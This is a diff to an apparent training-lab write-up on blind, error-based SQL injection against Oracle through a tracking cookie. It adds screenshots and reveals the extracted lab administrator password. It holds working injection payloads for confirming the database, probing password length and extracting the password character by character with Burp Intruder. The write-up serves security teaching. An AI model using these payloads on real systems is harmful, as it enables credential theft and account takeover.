@@ -26,20 +26,24 @@ Testing for SQL syntax errors to confirm the injection point.
 
 **Initial Cookie Value:**
 ```
-TrackingId=m8tMXxuFT2OxxsGn
+TrackingId=UgKz1orRXPh9Tcs9
 ```
 
 **Testing for SQL Injection:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'
+TrackingId=UgKz1orRXPh9Tcs9'
 ```
 **Result:** ❌ Error message received (unclosed quote causes syntax error)
 
+![Internal Server Error - SQL Injection Syntax Error](images/internal_server-error.jpg)
+
 **Testing Error Resolution:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn''
+TrackingId=UgKz1orRXPh9Tcs9''
 ```
 **Result:** ✅ No error (quotes are properly closed)
+
+![Normal Output - No SQL Error](images/no_error_all_products.jpg)
 
 ### Step 2: Confirm Oracle Database
 
@@ -47,21 +51,27 @@ Testing for Oracle-specific syntax to identify the database type.
 
 **Testing Basic Subquery:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT '')||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT '')||'
 ```
 **Result:** ❌ Error (Oracle requires table specification)
 
+![Internal Server Error - SQL Injection Syntax Error](images/internal_server-error.jpg)
+
 **Testing Oracle DUAL Table:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT '' FROM dual)||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT '' FROM dual)||'
 ```
 **Result:** ✅ No error (Oracle database confirmed)
 
+![Normal Output - No SQL Error](images/no_error_all_products.jpg)
+
 **Testing Invalid Table:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT '' FROM not-a-real-table)||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT '' FROM not-a-real-table)||'
 ```
 **Result:** ❌ Error (confirms SQL injection is working)
+
+![Internal Server Error - SQL Injection Syntax Error](images/internal_server-error.jpg)
 
 ### Step 3: Confirm Database Structure
 
@@ -69,15 +79,19 @@ Verifying the existence of the `users` table and `administrator` user.
 
 **Users Table Existence Test:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
 ```
 **Result:** ✅ No error (users table exists)
 
+![Normal Output - No SQL Error](images/no_error_all_products.jpg)
+
 **Administrator User Test:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 **Result:** ❌ Error received (condition is true, divide-by-zero triggered)
+
+![Internal Server Error - SQL Injection Syntax Error](images/internal_server-error.jpg)
 
 ### Step 4: Determine Password Length
 
@@ -85,21 +99,23 @@ Using conditional errors to determine password length through binary search.
 
 **Testing Length > 1:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 **Result:** ❌ Error (password > 1 character)
 
 **Testing Length > 19:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 **Result:** ❌ Error (password > 19 characters)
 
 **Testing Length > 20:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 **Result:** ✅ No error (password is NOT > 20 characters)
+
+![Normal Output - No SQL Error](images/no_error_all_products.jpg)
 
 **Final Result:** Password length is **20 characters**
 
@@ -110,7 +126,7 @@ Using Burp Intruder to systematically extract each character by triggering condi
 **Burp Intruder Setup:**
 - **Cookie Payload:**
 ```sql
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
 - **Payload Position:** Around the final `'a` character
@@ -119,7 +135,7 @@ TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO
 
 **Intruder Configuration:**
 ```
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
 **Attack Process:**
@@ -131,7 +147,9 @@ TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§'
 
 ![Intruder Results](images/intruder_result.jpg)
 
-**Extracted Password:** [REDACTED FOR SECURITY]
+**Extracted Password:** qjb57yrmswvzscoqxmoh
+
+**Character Mapping:** Position 1=q, 2=j, 3=b, 4=5, 5=7, 6=y, 7=r, 8=m, 9=s, 10=w, 11=v, 12=z, 13=s, 14=c, 15=o, 16=q, 17=x, 18=m, 19=o, 20=h
 
 ### Step 6: Authenticate as Administrator
 
@@ -139,7 +157,7 @@ Using the extracted password to log in as the administrator user.
 
 **Login Credentials:**
 - Username: administrator
-- Password: [20-character extracted password]
+- Password: qjb57yrmswvzscoqxmoh
 
 **Result:** ✅ Successfully authenticated as administrator
 
@@ -160,13 +178,13 @@ The lab is completed when:
 
 ```sql
 -- Basic injection test
-TrackingId=m8tMXxuFT2OxxsGn'
+TrackingId=UgKz1orRXPh9Tcs9'
 
 -- Oracle database confirmation
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT '' FROM dual)||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT '' FROM dual)||'
 
 -- Character extraction payload
-TrackingId=m8tMXxuFT2OxxsGn'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=UgKz1orRXPh9Tcs9'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
 ## Notes
